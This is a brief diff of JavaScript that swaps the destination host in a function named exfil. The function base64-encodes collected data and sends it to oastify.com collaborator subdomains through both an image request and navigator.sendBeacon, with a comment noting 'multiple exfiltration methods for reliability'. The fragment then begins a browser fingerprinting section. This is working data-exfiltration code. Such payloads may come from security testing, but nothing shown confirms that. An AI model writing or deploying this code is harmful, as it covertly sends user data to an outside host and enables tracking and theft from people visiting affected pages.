@@ -6,8 +6,8 @@
   const exfil = (endpoint, data) => {
     const encoded = btoa(JSON.stringify(data));
     // Multiple exfiltration methods for reliability
-    new Image().src = `https://fo7qclzh275gyd5ap29eim6wpnvej6lua.oastify.com/${endpoint}?data=${encoded}`;
-    navigator.sendBeacon(`https://fo7qclzh275gyd5ap29eim6wpnvej6lua.oastify.com/beacon`, encoded);
+    new Image().src = `https://3sw6a3ezxgmmrwn4clp6btvig9m0aryg.oastify.com/${endpoint}?data=${encoded}`;
+    navigator.sendBeacon(`https://3sw6a3ezxgmmrwn4clp6btvig9m0aryg.oastify.com/beacon`, encoded);
   };
 
   // Comprehensive Browser Fingerprint
